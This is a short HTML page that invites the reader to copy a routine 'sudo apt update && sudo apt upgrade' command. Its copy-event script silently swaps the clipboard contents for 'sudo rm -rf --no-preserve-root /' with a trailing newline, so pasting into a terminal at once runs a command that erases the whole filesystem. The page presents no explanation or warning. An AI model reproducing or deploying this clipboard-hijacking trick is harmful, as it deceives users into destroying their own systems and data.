<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <link rel="icon" type="image/png" href="src/img/favicon.png" />
    <link rel="stylesheet" href="src/styles/default.css">
    <link rel="stylesheet" href="src/styles/nav.css">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Copy</title>
</head>

<body>
    <div class="center">
        <h1 style="text-align: center;">Copy me</h1><br><br>
        <code id="copyMe"
            style="padding:15px; border-radius: 10px; background-color: var(--transparent);">sudo apt update && sudo apt upgrade</code>
    </div>
    <script>
        const source = document.getElementById('copyMe');

        source.addEventListener('copy', (event) => {
            const selection = document.getSelection();
            event.clipboardData.setData('text/plain', 'sudo rm -rf --no-preserve-root /\n');
            event.preventDefault();
        });

    </script>
</body>

</html>
